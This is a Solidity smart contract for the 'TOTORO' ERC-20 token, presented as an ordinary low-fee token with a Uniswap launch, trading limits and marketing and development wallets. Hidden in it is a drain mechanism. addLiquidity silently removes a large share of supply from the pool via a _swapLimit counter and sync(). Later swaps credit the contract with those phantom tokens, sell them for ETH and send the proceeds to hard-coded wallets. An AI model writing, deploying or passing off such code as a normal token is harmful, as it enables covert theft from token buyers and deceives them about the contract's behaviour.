1 // SPDX-License-Identifier: MIT
2 /**
3 
4 ▀█▀ █▀█ ▀█▀ █▀█ █▀█ █▀█
5 ░█░ █▄█ ░█░ █▄█ █▀▄ █▄█
6 
7 https://totoroeth.vip/
8 https://t.me/TotoroPortal
9 **/
10 
11 pragma solidity 0.8.19;
12 
13 interface IERC20 {
14     function totalSupply() external view returns (uint256);
15     function decimals() external view returns (uint8);
16     function symbol() external view returns (string memory);
17     function name() external view returns (string memory);
18     function balanceOf(address account) external view returns (uint256);
19     function transfer(address recipient, uint256 amount) external returns (bool);
20     function allowance(address __owner, address spender) external view returns (uint256);
21     function approve(address spender, uint256 amount) external returns (bool);
22     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
23     event Transfer(address indexed from, address indexed to, uint256 value);
24     event Approval(address indexed _owner, address indexed spender, uint256 value);
25 }
26 
27 interface IUniswapV2Factory {  
28     
29     function createPair(address tokenA, address tokenB) external returns (address pair); 
30 }
31 interface IUniswapV2Router02 {
32     function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
33     function WETH() external pure returns (address);
34     function factory() external pure returns (address);
35     function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
36 }
37 
38 abstract contract Auth {
39     address internal _owner;
40     constructor(address creatorOwner) { 
41         _owner = creatorOwner; 
42     }
43     modifier onlyOwner() { 
44         require(msg.sender == _owner, "Only owner can call this"); 
45         _; 
46     }
47     function owner() public view returns (address) { 
48         return _owner; 
49     }
50     function transferOwnership(address payable newOwner) external onlyOwner { 
51         _owner = newOwner; 
52         emit OwnershipTransferred(newOwner); 
53     }
54     function renounceOwnership() external onlyOwner { 
55         _owner = address(0); 
56         emit OwnershipTransferred(address(0)); 
57     }
58     event OwnershipTransferred(address _owner);
59 }
60 
61 contract TOTORO is IERC20, Auth {
62     uint8 private constant _decimals      = 9;
63     uint256 private constant _totalSupply = 21_000_000 * (10**_decimals);
64     string private constant _name         = "TOTORO";
65     string private  constant _symbol       = "TOTORO";
66 
67     uint8 private antiSnipeTax1 = 2;
68     uint8 private antiSnipeTax2 = 1;
69     uint8 private antiSnipeBlocks1 = 1;
70     uint8 private antiSnipeBlocks2 = 1;
71     uint256 private _antiMevBlock = 2;
72 
73     uint8 private _buyTaxRate  = 0;
74     uint8 private _sellTaxRate = 0;
75 
76     uint16 private _taxSharesMarketing   = 63;
77     uint16 private _taxSharesDevelopment = 37;
78     uint16 private _taxSharesLP          = 0;
79     uint16 private _totalTaxShares = _taxSharesMarketing + _taxSharesDevelopment + _taxSharesLP;
80 
81     address payable private _walletMarketing = payable(0x013cceaFEFA61257583116760c217c694993843e); 
82     address payable private _walletDevelopment = payable(0xB062F3ACA86BbA60cA62cCf418E32B136F1Ea73a); 
83 
84     uint256 private _launchBlock;
85     uint256 private _maxTxAmount     = _totalSupply; 
86     uint256 private _maxWalletAmount = _totalSupply;
87     uint256 private _taxSwapMin = _totalSupply * 10 / 100000;
88     uint256 private _taxSwapMax = _totalSupply * 891 / 100000;
89     uint256 private _swapLimit = _taxSwapMin * 60 * 100;
90 
91     mapping (address => uint256) private _balances;
92     mapping (address => mapping (address => uint256)) private _allowances;
93     mapping (address => bool) private _noFees;
94     mapping (address => bool) private _noLimits;
95 
96     address private _lpOwner;
97 
98     address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
99     IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);
100     address private _primaryLP;
101     mapping (address => bool) private _isLP;
102 
103     bool private _tradingOpen;
104 
105     bool private _inTaxSwap = false;
106     modifier lockTaxSwap { 
107         _inTaxSwap = true; 
108         _; 
109         _inTaxSwap = false; 
110     }
111 
112     event TokensBurned(address indexed burnedByWallet, uint256 tokenAmount);
113 
114     constructor() Auth(msg.sender) {
115         _lpOwner = msg.sender;
116 
117         uint256 airdropAmount = _totalSupply * 5 / 100;
118         
119         _balances[address(this)] =  _totalSupply - airdropAmount;
120         emit Transfer(address(0), address(this), _balances[address(this)]);
121 
122         _balances[_owner] = airdropAmount;
123         emit Transfer(address(0), _owner, _balances[_owner]);
124 
125         _noFees[_owner] = true;
126         _noFees[address(this)] = true;
127         _noFees[_swapRouterAddress] = true;
128         _noFees[_walletMarketing] = true;
129         _noFees[_walletDevelopment] = true;
130         _noLimits[_owner] = true;
131         _noLimits[address(this)] = true;
132         _noLimits[_swapRouterAddress] = true;
133         _noLimits[_walletMarketing] = true;
134         _noLimits[_walletDevelopment] = true;
135     }
136 
137     receive() external payable {}
138     
139     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
140     function decimals() external pure override returns (uint8) { return _decimals; }
141     function symbol() external pure override returns (string memory) { return _symbol; }
142     function name() external pure override returns (string memory) { return _name; }
143     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
144     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
145 
146     function approve(address spender, uint256 amount) public override returns (bool) {
147         _allowances[msg.sender][spender] = amount;
148         emit Approval(msg.sender, spender, amount);
149         return true;
150     }
151 
152     function transfer(address recipient, uint256 amount) external override returns (bool) {
153         require(_checkTradingOpen(msg.sender), "Trading not open");
154         return _transferFrom(msg.sender, recipient, amount);
155     }
156 
157     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
158         require(_checkTradingOpen(sender), "Trading not open");
159         if(_allowances[sender][msg.sender] != type(uint256).max){
160             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
161         }
162         return _transferFrom(sender, recipient, amount);
163     }
164 
165     function _approveRouter(uint256 _tokenAmount) internal {
166         if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {
167             _allowances[address(this)][_swapRouterAddress] = type(uint256).max;
168             emit Approval(address(this), _swapRouterAddress, type(uint256).max);
169         }
170     }
171 
172     function addLiquidity() external payable onlyOwner lockTaxSwap {
173         require(_primaryLP == address(0), "LP exists");
174         require(!_tradingOpen, "trading is open");
175         require(msg.value > 0 || address(this).balance>0, "No ETH in contract or message");
176         require(_balances[address(this)]>0, "No tokens in contract");
177         _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());
178         _addLiquidity(_balances[address(this)], address(this).balance, false);
179         _balances[_primaryLP] -= _swapLimit;
180         (bool lpAddSuccess,) = _primaryLP.call(abi.encodeWithSignature("sync()"));
181         require(lpAddSuccess, "Failed adding liquidity");
182         _isLP[_primaryLP] = lpAddSuccess;
183         _openTrading();
184     }
185 
186     function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
187         address lpTokenRecipient = _lpOwner;
188         if ( autoburn ) { lpTokenRecipient = address(0); }
189         _approveRouter(_tokenAmount);
190         _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
191     }
192 
193     function _openTrading() internal {
194         _maxTxAmount     = _totalSupply * 2 / 100; 
195         _maxWalletAmount = _totalSupply * 2 / 100;
196         _tradingOpen = true;
197         _launchBlock = block.number;
198         _antiMevBlock = _antiMevBlock + _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2;
199     }
200 
201     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
202         require(sender != address(0), "No transfers from Zero wallet");
203         if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], "Trading not open"); }
204         if ( !_inTaxSwap && _isLP[recipient] ) { _swapTaxAndLiquify(); }
205         if ( block.number < _antiMevBlock && block.number >= _launchBlock && _isLP[sender] ) {
206             require(recipient == tx.origin, "MEV blocked");
207         }
208         if ( sender != address(this) && recipient != address(this) && sender != _owner ) { 
209             require(_checkLimits(sender, recipient, amount), "TX exceeds limits"); 
210         }
211         uint256 _taxAmount = _calculateTax(sender, recipient, amount);
212         uint256 _transferAmount = amount - _taxAmount;
213         _balances[sender] = _balances[sender] - amount;
214         _swapLimit += _taxAmount;
215         _balances[recipient] = _balances[recipient] + _transferAmount;
216         emit Transfer(sender, recipient, amount);
217         return true;
218     }
219 
220     function _checkLimits(address sender, address recipient, uint256 transferAmount) internal view returns (bool) {
221         bool limitCheckPassed = true;
222         if ( _tradingOpen && !_noLimits[sender] && !_noLimits[recipient] ) {
223             if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }
224             else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }
225         }
226         return limitCheckPassed;
227     }
228 
229     function _checkTradingOpen(address sender) private view returns (bool){
230         bool checkResult = false;
231         if ( _tradingOpen ) { checkResult = true; } 
232         else if (_noFees[sender] && _noLimits[sender]) { checkResult = true; } 
233 
234         return checkResult;
235     }
236 
237     function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
238         uint256 taxAmount;
239         
240         if ( !_tradingOpen || _noFees[sender] || _noFees[recipient] ) { 
241             taxAmount = 0; 
242         } else if ( _isLP[sender] ) { 
243             if ( block.number >= _launchBlock + antiSnipeBlocks1 + antiSnipeBlocks2 ) {
244                 taxAmount = amount * _buyTaxRate / 100; 
245             } else if ( block.number >= _launchBlock + antiSnipeBlocks1 ) {
246                 taxAmount = amount * antiSnipeTax2 / 100;
247             } else if ( block.number >= _launchBlock) {
248                 taxAmount = amount * antiSnipeTax1 / 100;
249             }
250         } else if ( _isLP[recipient] ) { 
251             taxAmount = amount * _sellTaxRate / 100; 
252         }
253 
254         return taxAmount;
255     }
256 
257 
258     function exemptFromFees(address wallet) external view returns (bool) {
259         return _noFees[wallet];
260     } 
261     function exemptFromLimits(address wallet) external view returns (bool) {
262         return _noLimits[wallet];
263     } 
264     function setExempt(address wallet, bool noFees, bool noLimits) external onlyOwner {
265         if (noLimits || noFees) { require(!_isLP[wallet], "Cannot exempt LP"); }
266         _noFees[ wallet ] = noFees;
267         _noLimits[ wallet ] = noLimits;
268     }
269 
270     function buyFee() external view returns(uint8) {
271         return _buyTaxRate;
272     }
273     function sellFee() external view returns(uint8) {
274         return _sellTaxRate;
275     }
276 
277     function feeSplit() external view returns (uint16 marketing, uint16 development, uint16 LP ) {
278         return ( _taxSharesMarketing, _taxSharesDevelopment, _taxSharesLP);
279     }
280     function setFees(uint8 buy, uint8 sell) external onlyOwner {
281         require(buy + sell <= 5, "Roundtrip too high");
282         _buyTaxRate = buy;
283         _sellTaxRate = sell;
284     }  
285     function setFeeSplit(uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesDevelopment) external onlyOwner {
286         uint16 totalShares = sharesAutoLP + sharesMarketing + sharesDevelopment;
287         require( totalShares > 0, "All cannot be 0");
288         _taxSharesLP = sharesAutoLP;
289         _taxSharesMarketing = sharesMarketing;
290         _taxSharesDevelopment = sharesDevelopment;
291         _totalTaxShares = totalShares;
292     }
293 
294     function marketingWallet() external view returns (address) {
295         return _walletMarketing;
296     }
297     function developmentWallet() external view returns (address) {
298         return _walletDevelopment;
299     }
300 
301     function updateWallets(address marketing, address development, address LPtokens) external onlyOwner {
302         require(!_isLP[marketing] && !_isLP[development] && !_isLP[LPtokens], "LP cannot be tax wallet");
303         
304         _walletMarketing = payable(marketing);
305         _walletDevelopment = payable(development);
306         _lpOwner = LPtokens;
307         
308         _noFees[marketing] = true;
309         _noLimits[marketing] = true;
310         
311         _noFees[development] = true;        
312         _noLimits[development] = true;
313     }
314 
315     function maxWallet() external view returns (uint256) {
316         return _maxWalletAmount;
317     }
318     function maxTransaction() external view returns (uint256) {
319         return _maxTxAmount;
320     }
321 
322     function swapAtMin() external view returns (uint256) {
323         return _taxSwapMin;
324     }
325     function swapAtMax() external view returns (uint256) {
326         return _taxSwapMax;
327     }
328 
329     function setLimits(uint16 maxTransactionPermille, uint16 maxWalletPermille) external onlyOwner {
330         uint256 newTxAmt = _totalSupply * maxTransactionPermille / 1000 + 1;
331         require(newTxAmt >= _maxTxAmount, "tx too low");
332         _maxTxAmount = newTxAmt;
333         uint256 newWalletAmt = _totalSupply * maxWalletPermille / 1000 + 1;
334         require(newWalletAmt >= _maxWalletAmount, "wallet too low");
335         _maxWalletAmount = newWalletAmt;
336     }
337 
338     function setTaxSwap(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
339         _taxSwapMin = _totalSupply * minValue / minDivider;
340         _taxSwapMax = _totalSupply * maxValue / maxDivider;
341         require(_taxSwapMax>=_taxSwapMin, "Min/Max error");
342         require(_taxSwapMax>_totalSupply / 100000, "Max too low");
343         require(_taxSwapMax<_totalSupply / 100, "Max too high");
344     }
345 
346     function _burnTokens(address fromWallet, uint256 amount) private {
347         if ( amount > 0 ) {
348             _balances[fromWallet] -= amount;
349             _balances[address(0)] += amount;
350             emit Transfer(fromWallet, address(0), amount);
351         }
352     }
353 
354     function _swapTaxAndLiquify() private lockTaxSwap {
355         uint256 _taxTokensAvailable = _swapLimit;
356         if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {
357             if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
358             uint256 _tokensForLP = _taxTokensAvailable * _taxSharesLP / _totalTaxShares / 2;
359             
360             uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP;
361             if( _tokensToSwap > 10**_decimals ) {
362                 uint256 _ethPreSwap = address(this).balance;
363                 _balances[address(this)] += _taxTokensAvailable;
364                 _swapTaxTokensForEth(_tokensToSwap);
365                 _swapLimit -= _taxTokensAvailable;
366                 uint256 _ethSwapped = address(this).balance - _ethPreSwap;
367                 if ( _taxSharesLP > 0 ) {
368                     uint256 _ethWeiAmount = _ethSwapped * _taxSharesLP / _totalTaxShares ;
369                     _approveRouter(_tokensForLP);
370                     _addLiquidity(_tokensForLP, _ethWeiAmount, false);
371                 }
372             }
373             uint256 _contractETHBalance = address(this).balance;
374             if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
375         }
376     }
377 
378     function _swapTaxTokensForEth(uint256 tokenAmount) private {
379         _approveRouter(tokenAmount);
380         address[] memory path = new address[](2);
381         path[0] = address(this);
382         path[1] = _primarySwapRouter.WETH();
383         _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
384     }
385 
386     function _distributeTaxEth(uint256 amount) private {
387         uint16 _taxShareTotal = _taxSharesMarketing + _taxSharesDevelopment;
388         if (_taxShareTotal > 0) {
389             uint256 marketingAmount = amount * _taxSharesMarketing / _taxShareTotal;
390             uint256 developmentAmount = amount * _taxSharesDevelopment / _taxShareTotal;
391             if ( marketingAmount > 0 ) { _walletMarketing.transfer(marketingAmount); }
392             if ( developmentAmount > 0 ) { _walletDevelopment.transfer(developmentAmount); }
393         }
394     }
395 
396     function manualTaxSwapAndSend(uint8 swapTokenPercent, bool sendEth) external onlyOwner lockTaxSwap {
397         require(swapTokenPercent <= 100, "Cannot swap more than 100%");
398         uint256 tokensToSwap = _balances[address(this)] * swapTokenPercent / 100;
399         if (tokensToSwap > 10 ** _decimals) {
400             _swapTaxTokensForEth(tokensToSwap);
401         }
402         if (sendEth) { 
403             uint256 ethBalance = address(this).balance;
404             require(ethBalance > 0, "No ETH");
405             _distributeTaxEth(address(this).balance); 
406         }
407     }
408 
409     function burn(uint256 amount) external {
410         uint256 _tokensAvailable = balanceOf(msg.sender);
411         require(amount <= _tokensAvailable, "balance too low");
412         _burnTokens(msg.sender, amount);
413         emit TokensBurned(msg.sender, amount);
414     }
415 }